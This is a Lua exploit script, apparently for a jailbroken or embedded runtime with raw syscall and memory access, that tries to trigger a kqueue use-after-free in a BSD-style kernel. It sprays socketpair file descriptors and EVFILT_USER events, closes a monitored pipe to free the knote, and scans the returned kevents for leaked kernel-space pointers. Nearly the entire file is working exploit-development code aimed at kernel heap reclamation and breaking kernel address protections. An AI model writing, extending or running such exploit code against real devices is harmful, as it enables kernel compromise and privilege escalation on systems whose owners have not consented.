--[[
    uaf_kqueue_spray.lua
    kqueue UAF with alternative spray objects (pipes, sockets, etc.)
    The knote is 0x80 bytes. Can we reclaim the freed slot with a
    different object that WE control the content of?
]]
local S = rawget(_G, "syscall")
local mem = rawget(_G, "memory")
local nat = rawget(_G, "native")

local function tonn(v)
    if v == nil then return 0 end
    if type(v) == "table" and v.h then return v.h * 4294967296 + v.l end
    return tonumber(tostring(v or 0)) or 0
end

S.resolve({
    kqueue = 362, kevent = 363, pipe = 42, close = 6,
    write = 4, read = 3, getpid = 20, socketpair = 0x87,
})

local function mkkevent(filter, ident, flags, fflags, data, udata)
    local ev = mem.alloc(32)
    mem.write_qword(ev, ident)
    mem.write_word(ev+8, filter)
    mem.write_word(ev+10, flags)
    mem.write_dword(ev+12, fflags or 0)
    mem.write_qword(ev+16, data or 0)
    mem.write_qword(ev+24, udata or 0)
    return ev
end

print("[+] UAF + Alternative Spray\n")

-- Create kqueue
local kq = tonn(S.kqueue())
print(string.format("kqueue=%d\n", kq))

-- Create pipe for triggering UAF
local pfds = mem.alloc(8)
tonn(S.pipe(pfds))
local p_rd = tonn(mem.read_dword(pfds))
local p_wr = tonn(mem.read_dword(pfds+4))
print(string.format("pipe rd=%d wr=%d\n", p_rd, p_wr))

-- Register EVFILT_READ on pipe (allocates knote K1 on pipe's knlist)
local ev = mkkevent(-1, p_rd, 5, 0, 0, 0xDEAD)  -- EVFILT_READ=-1
local r = tonn(S.kevent(kq, ev, 1, 0, 0, 0))
print(string.format("EVFILT_READ reg=%d\n", r))

-- Now spray with SOCKETPAIR fds (each socketpair creates 2 file structs ~0x80 bytes)
-- This is an alternative spray object
print("[*] Spraying with socketpairs...\n")
local spray_fds = {}
for i = 1, 100 do
    local sp = mem.alloc(8)
    local rsp = tonn(S.socketpair(1, 2, 0, sp))
    if rsp == 0 then
        spray_fds[i*2-1] = tonn(mem.read_dword(sp))
        spray_fds[i*2] = tonn(mem.read_dword(sp+4))
    end
end
print(string.format("  created %d sockets\n", #spray_fds))

-- Also allocate EVFILT_USER events to pre-fill the kqueue
print("[*] Adding EVFILT_USER events...\n")
for i = 1, 50 do
    local uev = mkkevent(-7, i, 5, 0, 0, i)
    S.kevent(kq, uev, 1, 0, 0, 0)
end

-- Trigger UAF: close pipe while kqueue monitor is active
print("[*] Triggering UAF by closing pipe...\n")
tonn(S.close(p_rd))
tonn(S.close(p_wr))

-- Read events from kqueue
local outbuf = mem.alloc(3200)
local nevents = tonn(S.kevent(kq, 0, 0, outbuf, 100, 0))
print(string.format("kevent returned %d events\n", nevents))

-- Check events for kernel pointers
local kptr_count = 0
for i = 0, nevents-1 do
    local off = i * 32
    local ident = tonn(mem.read_qword(outbuf + off))
    local filter = tonn(mem.read_word(outbuf + off + 8))
    local flags = tonn(mem.read_word(outbuf + off + 10))
    local udata = tonn(mem.read_qword(outbuf + off + 24))
    
    -- Check for kernel pointers (addresses in kernel space 0xFFFF...)
    if ident > 0xFFFF000000000000 or udata > 0xFFFF000000000000 then
        kptr_count = kptr_count + 1
        print(string.format("  [%d] ident=0x%x filter=%d flags=0x%x udata=0x%x [KPTR!]", 
            i, ident, filter, flags, udata))
    end
end

print(string.format("\nKernel pointers found: %d\n", kptr_count))

-- Also close some spray sockets to see if it affects kqueue
print("[*] Closing 20 spray sockets...\n")
for i = 1, 20 do
    tonn(S.close(spray_fds[i]))
end

-- Read events again
nevents = tonn(S.kevent(kq, 0, 0, outbuf, 100, 0))
print(string.format("After close: kevent returned %d events\n", nevents))

print("\n[+] Done")
